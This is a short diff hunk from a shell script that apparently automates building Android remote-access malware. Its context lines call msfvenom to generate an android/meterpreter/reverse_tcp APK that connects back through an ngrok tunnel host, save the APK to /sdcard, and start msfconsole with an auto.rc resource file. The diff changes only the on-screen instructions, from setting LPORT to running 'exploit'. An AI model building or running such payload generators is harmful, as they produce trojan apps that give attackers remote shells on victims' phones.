@@ -14,8 +14,8 @@ read -p '>> ' APK
 msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$LPORT R >/sdcard/$APK.apk
 msfconsole -r auto.rc
 else
-echo 'you must run this commamd: '
-echo 'set LPORT <your ngrok port> ' | lolcat
+echo 'you must run this commamd to start: '
+echo 'exploit' | lolcat
 msfconsole -r auto.rc
 fi
 else
